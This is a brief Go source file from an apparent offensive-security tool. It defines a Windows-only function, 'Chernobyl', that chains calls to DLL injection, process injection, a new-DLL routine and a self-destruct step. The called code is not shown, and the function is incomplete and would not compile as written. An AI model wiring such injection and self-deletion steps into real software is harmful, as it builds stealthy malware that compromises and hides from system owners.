//go:build windows
// +build windows

package nefarious

import (
	"fmt"
	"github.com/shawnstephens517/go_enumer/pkg/nefarious/windowsactions"
)

/*
Since most of these actions require quite a bit of code to perform,
This will serve as the handle/middleware between the logic and the call
at runtime.
*/

func Chernobyl() (string, error){
	var result string
	injectDll := windowsactions.DLLInject()
	injectProcess := windowsactions.ProcessInject()
	newDLL := windowsactions.NewDLL()
	selfDestruct := windowsactions.Voltorb()
}
